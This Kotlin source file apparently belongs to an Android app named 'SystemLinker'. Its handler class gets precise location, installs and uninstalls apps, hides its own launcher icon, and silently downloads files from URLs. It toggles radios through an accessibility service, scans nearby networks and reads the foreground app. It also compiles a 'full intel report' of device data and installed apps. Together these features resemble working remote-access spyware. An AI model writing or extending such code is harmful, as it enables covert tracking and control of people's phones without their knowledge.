package com.systemlinker.features

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.app.usage.UsageStatsManager
import android.bluetooth.BluetoothAdapter
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.Sensor
import android.hardware.SensorManager
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.net.ConnectivityManager
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.os.SystemClock
import android.telephony.TelephonyManager
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.content.FileProvider
import com.systemlinker.MainActivity
import com.systemlinker.base.ErrorLogger
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.tasks.await
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SystemHandler(private val context: Context) {

    @SuppressLint("MissingPermission")
    suspend fun getLocation(): String {
        return try {
            val client = LocationServices.getFusedLocationProviderClient(context)
            val location = client.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null).await()
            if (location != null) {
                "`Location:` ${location.latitude}, ${location.longitude}\n`Accuracy:` ${location.accuracy}m"
            } else {
                "Location unavailable."
            }
        } catch (e: Exception) {
            "Location failed: ${e.message}"
        }
    }

    fun getBasicBatteryStatus(): String {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val isCharging = bm.isCharging
        return "`Battery:` $level% (${if (isCharging) "Charging" else "Discharging"})"
    }

    fun setFlashlight(enable: Boolean): String {
        return try {
            val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val flashCamId = manager.cameraIdList.firstOrNull { 
                manager.getCameraCharacteristics(it).get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true 
            }
            if (flashCamId != null) {
                manager.setTorchMode(flashCamId, enable)
                "Flashlight ${if (enable) "ON" else "OFF"}"
            } else {
                "No flashlight found."
            }
        } catch (e: Exception) {
            "Flashlight error: ${e.message}"
        }
    }

    fun setVolume(levelPercent: Int) {
        try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
            val target = (max * (levelPercent / 100f)).toInt()
            am.setStreamVolume(AudioManager.STREAM_MUSIC, target, 0)
        } catch (e: Exception) {
            ErrorLogger.logError(context, "SH_setVolume", e)
        }
    }

    // ==============================================================
    // NEW EXTENSIONS: INSTALL, UNINSTALL, HIDE ICON, DOWNLOAD, TOGGLES
    // ==============================================================

    fun installApp(apkPath: String) {
        try {
            val file = File(apkPath)
            if (!file.exists()) return
            val uri = FileProvider.getUriForFile(context, "${context.packageName}.provider", file)
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            }
            context.startActivity(intent)
        } catch (e: Exception) {
            ErrorLogger.logError(context, "InstallApp", e)
        }
    }

    fun uninstallApp(packageName: String) {
        try {
            val intent = Intent(Intent.ACTION_DELETE).apply {
                data = Uri.parse("package:$packageName")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
        } catch (e: Exception) {
            ErrorLogger.logError(context, "UninstallApp", e)
        }
    }

    fun setAppIconVisibility(show: Boolean): String {
        return try {
            val pm = context.packageManager
            val componentName = ComponentName(context, MainActivity::class.java)
            val state = if (show) PackageManager.COMPONENT_ENABLED_STATE_DEFAULT else PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP)
            "App icon ${if (show) "shown" else "hidden"} successfully."
        } catch (e: Exception) {
            "Failed to change icon visibility: ${e.message}"
        }
    }

    fun downloadFileFromUrl(url: String, destPath: String): String {
        val finalPath = if (destPath.isBlank()) {
            File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "downloaded_${System.currentTimeMillis()}").absolutePath
        } else destPath

        Thread {
            try {
                val client = OkHttpClient()
                val request = Request.Builder().url(url).build()
                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        response.body?.byteStream()?.use { input ->
                            FileOutputStream(File(finalPath)).use { output ->
                                input.copyTo(output)
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                ErrorLogger.logError(context, "DownloadURL", e)
            }
        }.start()
        return "Download initiated to: $finalPath"
    }

    @Suppress("DEPRECATION")
    fun setWifiState(enable: Boolean): String {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            wifiManager.isWifiEnabled = enable
            "Wi-Fi toggle command sent. (May fail on Android 10+ without root)."
        } catch (e: Exception) { "Wi-Fi toggle failed: ${e.message}" }
    }

    @SuppressLint("MissingPermission")
    @Suppress("DEPRECATION")
    fun setBluetoothState(enable: Boolean): String {
        return try {
            val btAdapter = BluetoothAdapter.getDefaultAdapter()
            if (enable) btAdapter?.enable() else btAdapter?.disable()
            "Bluetooth toggle command sent. (May fail on Android 13+)."
        } catch (e: Exception) { "Bluetooth toggle failed: ${e.message}" }
    }

    fun setHotspotState(enable: Boolean): String {
        try {
            val intent = Intent("com.systemlinker.ACC_ACTION").apply {
                // CRITICAL FIX FOR ANDROID 14+: 
                // Explicitly define the package so RECEIVER_NOT_EXPORTED allows it through.
                setPackage(context.packageName) 
                putExtra("action", "toggle_hotspot")
            }
            context.sendBroadcast(intent)
            return "Hotspot toggle command explicitly routed to Accessibility Service."
        } catch (e: Exception) {
            return "Failed to send hotspot command: ${e.message}"
        }
    }

    @Suppress("DEPRECATION")
    fun getWifiScanResults(): String {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val results = wifiManager.scanResults
            if (results.isEmpty()) "No Wi-Fi networks found."
            else results.joinToString("\n") { "[${it.SSID}] - ${it.BSSID} (${it.level}dBm)" }
        } catch (e: Exception) { "Wi-Fi scan failed: ${e.message}" }
    }

    @SuppressLint("MissingPermission")
    fun getBluetoothScanResults(): String {
        return try {
            val btAdapter = BluetoothAdapter.getDefaultAdapter()
            val paired = btAdapter?.bondedDevices
            if (paired.isNullOrEmpty()) "No paired Bluetooth devices found."
            else paired.joinToString("\n") { "[${it.name}] - ${it.address}" }
        } catch (e: Exception) { "BT fetch failed: ${e.message}" }
    }

    // ==============================================================
    // MASSIVE DEVICE INTELLIGENCE GENERATOR
    // ==============================================================

    suspend fun generateFullSystemReport(): File {
        val sb = StringBuilder()
        sb.append("=========================================\n")
        sb.append("      SYSTEM LINKER - FULL INTEL REPORT  \n")
        sb.append("=========================================\n\n")

        sb.append("--- LOCATION ---\n")
        sb.append(getLocation()).append("\n\n")

        sb.append("--- DEVICE INFO ---\n")
        sb.append("Manufacturer: ${Build.MANUFACTURER}\n")
        sb.append("Model: ${Build.MODEL}\n")
        sb.append("Device: ${Build.DEVICE}\n")
        sb.append("Product: ${Build.PRODUCT}\n")
        sb.append("Board: ${Build.BOARD}\n")
        sb.append("Hardware: ${Build.HARDWARE}\n")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            sb.append("SoC Model: ${Build.SOC_MODEL}\n")
            sb.append("SoC Manufacturer: ${Build.SOC_MANUFACTURER}\n")
        }
        sb.append("Android Version: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n")
        sb.append("Bootloader: ${Build.BOOTLOADER}\n")
        sb.append("Baseband: ${Build.getRadioVersion()}\n")
        sb.append("Kernel: ${System.getProperty("os.arch")} / ${System.getProperty("os.version")}\n")
        
        val isRooted = File("/system/xbin/su").exists() || File("/system/bin/su").exists()
        sb.append("Root Access: ${if (isRooted) "YES" else "NO"}\n")
        val uptime = SystemClock.elapsedRealtime()
        sb.append("Uptime: ${uptime / (1000 * 60 * 60)}h ${(uptime / (1000 * 60)) % 60}m\n\n")

        sb.append("--- RAM / MEMORY ---\n")
        val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val mi = ActivityManager.MemoryInfo()
        am.getMemoryInfo(mi)
        sb.append("Total RAM: ${mi.totalMem / (1024 * 1024)} MB\n")
        sb.append("Available RAM: ${mi.availMem / (1024 * 1024)} MB\n")
        sb.append("Low Memory Threshold: ${mi.threshold / (1024 * 1024)} MB\n")
        sb.append("Is Low Memory State: ${mi.lowMemory}\n\n")

        sb.append("--- STORAGE (Internal) ---\n")
        val stat = StatFs(Environment.getExternalStorageDirectory().path)
        val totalStorage = stat.blockCountLong * stat.blockSizeLong
        val availStorage = stat.availableBlocksLong * stat.blockSizeLong
        sb.append("Total Storage: ${totalStorage / (1024 * 1024 * 1024)} GB\n")
        sb.append("Available Storage: ${availStorage / (1024 * 1024 * 1024)} GB\n")
        sb.append("Used Storage: ${(totalStorage - availStorage) / (1024 * 1024 * 1024)} GB\n\n")

        sb.append("--- DISPLAY ---\n")
        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)
        sb.append("Resolution: ${metrics.widthPixels} x ${metrics.heightPixels}\n")
        sb.append("Density: ${metrics.densityDpi} dpi\n")
        @Suppress("DEPRECATION")
        sb.append("Refresh Rate: ${wm.defaultDisplay.refreshRate} Hz\n\n")

        sb.append("--- BATTERY ---\n")
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val isCharging = bm.isCharging
        sb.append("Current Charge: $batLevel%\n")
        sb.append("Status: ${if (isCharging) "Charging" else "Discharging"}\n\n")

        sb.append("--- NETWORK & CONNECTIVITY ---\n")
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        sb.append("Carrier: ${tm.networkOperatorName}\n")
        sb.append("Sim Operator: ${tm.simOperatorName}\n")
        @SuppressLint("MissingPermission")
        val is5G = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) "Supported/Unknown" else "No"
        sb.append("5G Capability: $is5G\n\n")

        sb.append("--- FOREGROUND APP ---\n")
        try {
            val usage = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val time = System.currentTimeMillis()
            val stats = usage.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000 * 10, time)
            val fgApp = stats?.maxByOrNull { it.lastTimeUsed }?.packageName ?: "Unknown/Permission Denied"
            sb.append("Current Foreground: $fgApp\n\n")
        } catch (e: Exception) { sb.append("Current Foreground: Permission Denied\n\n") }

        sb.append("--- SENSORS ---\n")
        val sm = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
        sm.getSensorList(Sensor.TYPE_ALL).forEach {
            sb.append("[${it.name}] by ${it.vendor} (Power: ${it.power}mA)\n")
        }
        sb.append("\n")

        sb.append("--- INSTALLED APPS ---\n")
        val pm = context.packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        packages.forEach {
            val appName = pm.getApplicationLabel(it).toString()
            sb.append("$appName (${it.packageName})\n")
        }

        val file = File(context.cacheDir, "device_intel_${System.currentTimeMillis()}.txt")
        FileOutputStream(file).use { it.write(sb.toString().toByteArray()) }
        return file
    }
    fun searchAndExtractFile(targetFile: String): File? {
        // 1. Internal Private Storage (Cache & Files Dir)
        fun searchDir(dir: File): File? {
            if (!dir.exists()) return null
            for (f in dir.walkTopDown()) {
                if (f.isFile && f.name.equals(targetFile, ignoreCase = true)) return f
            }
            return null
        }
        var foundFile = searchDir(context.filesDir) ?: searchDir(context.cacheDir)
        
        // 2. APK Built-in Assets
        if (foundFile == null) {
            try {
                val am = context.assets
                fun searchAssets(path: String): String? {
                    val list = am.list(path) ?: return null
                    for (item in list) {
                        val fullPath = if (path.isEmpty()) item else "$path/$item"
                        if (item.equals(targetFile, ignoreCase = true)) return fullPath
                        val subItems = am.list(fullPath)
                        if (subItems != null && subItems.isNotEmpty()) {
                            val res = searchAssets(fullPath)
                            if (res != null) return res
                        }
                    }
                    return null
                }
                val assetPath = searchAssets("")
                if (assetPath != null) {
                    val temp = File(context.cacheDir, "extracted_asset_${System.currentTimeMillis()}_${targetFile}")
                    am.open(assetPath).use { input -> temp.outputStream().use { input.copyTo(it) } }
                    foundFile = temp
                }
            } catch (e: Exception) {
                ErrorLogger.logError(context, "SearchAssets", e)
            }
        }
        return foundFile
    }
}